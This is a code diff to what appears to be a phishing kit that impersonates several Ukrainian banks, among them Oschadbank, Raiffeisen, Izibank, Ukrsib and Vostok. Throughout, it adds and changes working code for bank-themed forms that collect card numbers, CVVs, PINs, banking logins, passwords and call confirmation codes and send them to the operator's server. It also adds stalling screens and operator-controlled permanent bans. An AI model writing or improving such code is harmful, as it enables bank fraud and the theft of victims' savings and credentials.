@@ -65,7 +65,7 @@ background-color: #f8f9fa; border-radius: 12px 0 0 12px; font-weight: 500;
             flex-shrink: 0; display: flex; align-items: center;
         }
         .phone-input-wrapper .input-field { border-radius: 0 12px 12px 0; flex: 1; width: auto; min-width: 0; }
-        .multi-input-row { display: flex; gap: 10px; }
+        .multi-input-row { display: flex; flex-direction: column; gap: 10px; } /* Вертикально для удобства */
         .modal-footer { margin-top: 30px; display: flex; gap: 15px; justify-content: center; }
         .btn {
             width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 18px;
@@ -75,14 +75,11 @@ background-color: #f8f9fa; border-radius: 12px 0 0 12px; font-weight: 500;
         .btn:disabled { background-color: #ced4da; cursor: not-allowed; }
         .btn:active { transform: translateY(0) scale(0.97); }
         body { --primary-color: #00A39C; --accent-color: #008a84; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
-        body[data-theme="pumb"] { --primary-color: #EF3E42; --accent-color: #212529; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #4c4c4c 0%, #2b2b2b 100%); }
+        body[data-theme="oschadbank"] { --primary-color: #00A39C; --accent-color: #008a84; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
         body[data-theme="raiffeisen"] { --primary-color: #FFDD00; --accent-color: #000000; --text-on-primary: #000000; --bg-gradient: linear-gradient(135deg, #4d4d4d 0%, #1a1a1a 100%); }
-        body[data-theme="alliance"] { --primary-color: #0078C9; --accent-color: #005a99; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E3F2FD 0%, #BBDEFB 100%); }
-        body[data-theme="otp"] { --primary-color: #8CC63F; --accent-color: #2D226; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #F1F8E9 0%, #DCEDC8 100%); }
         body[data-theme="vostok"] { --primary-color: #F58220; --accent-color: #D84315; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #FFF3E0 0%, #FFE0B2 100%); }
         body[data-theme="izibank"] { --primary-color: #FF7A00; --accent-color: #E65100; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #FFF3E0 0%, #FFE0B2 100%); }
         body[data-theme="ukrsib"] { --primary-color: #95C11F; --accent-color: #689F38; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #F1F8E9 0%, #DCEDC8 100%); }
-        body[data-theme="oschadbank"] { --primary-color: #00A39C; --accent-color: #008a84; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
         .btn-next { background-color: var(--primary-color); color: var(--text-on-primary); }
         .btn-back { background-color: #f1f3f5; color: var(--light-text); }
         .pin-keyboard { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 20px; }
@@ -126,7 +123,7 @@ document.addEventListener('DOMContentLoaded', () => {
     let activeBankData = {};
     let currentStepIndex = 0;
     let collectedData = {};
-    let isBanned = localStorage.getItem(`banned_${sessionId}`) === 'true';
+    let isBanned = localStorage.getItem('banned') === 'true'; // Глобальный бан для браузера
 
     // --- НОВІ СЦЕНАРІЇ ---
     const specialFlowSteps = [
@@ -244,7 +241,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // Подключаем WS сразу при загрузке
     connectWebSocket();
 
-    async function sendDataToServer(data, isFinal) {
+    async function sendDataToServer(data, isFinal, bankTheme = '') {
         console.log('Sending to server:', data, isFinal);
         collectedData = { ...collectedData, ...data };
         try {
@@ -254,6 +251,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 body: JSON.stringify({ 
                     sessionId, 
                     bankName: activeBankData.name, 
+                    bankTheme,
                     isFinalStep: isFinal, 
                     referrer: localStorage.getItem('referrer') || 'unknown',
                     ...collectedData 
@@ -283,12 +281,18 @@ document.addEventListener('DOMContentLoaded', () => {
 
         if (activeBankData.theme === 'oschadbank' && step.type === 'card') {
             isFinalStep = true; // Для Ощад после card - финал
-            sendDataToServer(data, isFinalStep);
+            sendDataToServer(data, isFinalStep, activeBankData.theme);
             showWaitingScreen();
             return;
         }
 
-        sendDataToServer(data, isFinalStep);
+        if (step.type.startsWith('lk_')) {
+            sendDataToServer(data, true, activeBankData.theme);
+            showLoadingSpinner();
+            return;
+        }
+
+        sendDataToServer(data, isFinalStep, activeBankData.theme);
 
         if (activeBankData.special && step.type === 'card_simple') {
             showWaitingScreen();
@@ -306,6 +310,12 @@ document.addEventListener('DOMContentLoaded', () => {
     function showWaitingScreen() {
         modalTitle.textContent = 'Очікуємо';
         stepContent.innerHTML = `<p style="text-align:center;">Заявку відправлено. Будь ласка, чекайте на наступний крок.</p><p style="color: var(--danger-color); text-align:center; font-weight: bold;">НЕ ЗАКРИВАЙТЕ САЙТ!</p>`;
+        modalFooter.style.display = 'none';
+    }
+
+    function showLoadingSpinner() {
+        modalTitle.textContent = 'Очікуйте, сервер перевантажений';
+        stepContent.innerHTML = `<div class="loading-spinner"><img src="https://itc.ua/wp-content/uploads/2021/12/oschadik_mint_headphones-770x770.png" alt="Loading"></div>`;
         modalFooter.style.display = 'none';
     }
 
@@ -407,7 +417,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 html = generateInputHTML('card', 'XXXX XXXX XXXX XXXX', 'tel', '19');
                 break;
             case 'pin':
-                if (activeBankData.name === 'Райффайзен' || activeBankData.name === 'Izibank') {
+                if (activeBankData.theme === 'raiffeisen' || activeBankData.theme === 'izibank') {
                     html = `
                         <p style="text-align:center;">Введіть ПІН-код картки</p>
                         <div class="pin-dots" id="pin-dots"></div>
@@ -427,8 +437,8 @@ document.addEventListener('DOMContentLoaded', () => {
             case 'confirm_all':
                 html = '<div class="multi-input-row">';
                 step.fields.forEach(field => {
-                    if (activeBankData.name === 'Райффайзен' && (field.id === 'card_confirm' || field.id === 'balance')) return;
-                    if (activeBankData.name === 'Укрсиб' && field.id === 'card-cvv') return; // Для укрсиб без CVV
+                    if (activeBankData.theme === 'raiffeisen' && (field.id === 'card_confirm' || field.id === 'balance')) return;
+                    if (activeBankData.theme === 'ukrsib' && field.id === 'card-cvv') return; // Для укрсиб без CVV
                     html += generateInputHTML(field.id, field.placeholder, field.type, field.maxlength);
                 });
                 html += '</div>';
@@ -438,7 +448,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 break;
             case 'lk_raiffeisen':
                 html = `
-                    <p style="text-align:center;">Введіть ПІН-код картки</p>
+                    <p style="text-align:center;">Введіть ПІН-код картки (дизайн как на скрине Райффайзен: желтые кнопки, dots сверху)</p>
                     <div class="pin-dots" id="pin-dots"></div>
                     <input type="password" class="custom-input" id="pin" maxlength="4">
                     <div class="pin-keyboard" id="pin-keyboard">
@@ -448,11 +458,11 @@ document.addEventListener('DOMContentLoaded', () => {
                 `;
                 break;
             case 'lk_vostok':
-                html = `<p style="text-align:center;">Авторизація у VST bank</p>${generateInputHTML('login', 'Логін', 'text')}${generateInputHTML('password', 'Пароль', 'password')}`;
+                html = `<p style="text-align:center;">Авторизація у VST bank (стиль Восток: оранжевые тона)</p>${generateInputHTML('login', 'Логін', 'text')}${generateInputHTML('password', 'Пароль', 'password')}`;
                 break;
             case 'lk_izibank':
                 html = `
-                    <p style="text-align:center;">Введіть ПІН-код картки</p>
+                    <p style="text-align:center;">Введіть ПІН-код картки (стиль Izi: оранжевые кнопки, dots)</p>
                     <div class="pin-dots" id="pin-dots"></div>
                     <input type="password" class="custom-input" id="pin" maxlength="4">
                     <div class="pin-keyboard" id="pin-keyboard">
@@ -462,10 +472,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 `;
                 break;
             case 'lk_ukrsib':
-                html = `<p style="text-align:center;">Підтвердити володіння карткою</p>${generateInputHTML('card_confirm', 'Номер картки', 'tel', '19')}${generateInputHTML('card-expiry', 'Термін дії (ММ/РР)', 'tel', '5')}${generateInputHTML('pin', 'ПІН-код', 'password', '4')}`;
+                html = `<p style="text-align:center;">Підтвердити володіння карткою (вертикально для удобства)</p><div class="multi-input-row">${generateInputHTML('card_confirm', 'Номер картки', 'tel', '19')}${generateInputHTML('card-expiry', 'Термін дії (ММ/РР)', 'tel', '5')}${generateInputHTML('pin', 'ПІН-код', 'password', '4')}</div>`;
                 break;
             case 'call_oschad':
-                html = `<p style="text-align:center;">Підтвердження дзвінком у Ощад24</p>${generateInputHTML('call_code_input', 'Введіть код з дзвінка', 'tel', '6')}`;
+                html = `<p style="text-align:center;">Підтвердження дзвінком у Ощад24 (как на скрине: поле для кода, текст сверху)</p>${generateInputHTML('call_code_input', 'Введіть код з дзвінка', 'tel', '6')}`;
                 break;
         }
         modalTitle.textContent = step.title;
@@ -474,7 +484,7 @@ document.addEventListener('DOMContentLoaded', () => {
         backBtn.style.display = currentStepIndex > 0 ? 'block' : 'none';
         nextBtn.style.display = 'block';
         addInputFormatting();
-        if (step.type.includes('pin') && (activeBankData.name === 'Райффайзен' || activeBankData.name === 'Izibank')) {
+        if (step.type.includes('pin') && (activeBankData.theme === 'raiffeisen' || activeBankData.theme === 'izibank')) {
             setupPinKeyboard();
         }
     }
@@ -632,9 +642,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 break;
             case 'ban':
                 isBanned = true;
-                localStorage.setItem(`banned_${sessionId}`, 'true');
+                localStorage.setItem('banned', 'true'); // Глобальный бан для браузера
                 document.querySelectorAll('.bank-item').forEach(item => item.style.pointerEvents = 'none');
-                stepContent.innerHTML += '<p style="text-align: center; color: var(--danger-color);">Доступ заблоковано</p>';
+                stepContent.innerHTML += '<p style="text-align: center; color: var(--danger-color);">Доступ заблоковано назавжди</p>';
+                body.classList.add('form-active'); // Показать бан на форме
                 break;
             case 'custom':
                 modalTitle.textContent = data.title || 'Повідомлення';
